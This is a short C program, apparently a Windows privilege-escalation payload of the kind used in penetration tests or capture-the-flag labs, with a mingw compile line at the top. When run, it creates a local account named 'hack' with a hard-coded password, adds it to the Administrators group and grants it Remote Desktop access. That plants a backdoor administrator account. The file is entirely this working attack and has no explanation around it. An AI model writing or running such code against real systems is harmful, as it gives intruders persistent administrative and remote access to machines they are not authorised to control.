//i686-w64-mingw32-gcc adduser.c -o adduser.exe
#include <windows.h>

void main(){
    system("cmd /c net user hack potatoPOTATO3$ /add");
    system("cmd /c net localgroup Administrators hack /add");
    system("cmd /c net localgroup \"Remote Desktop Users\" hack /add");
}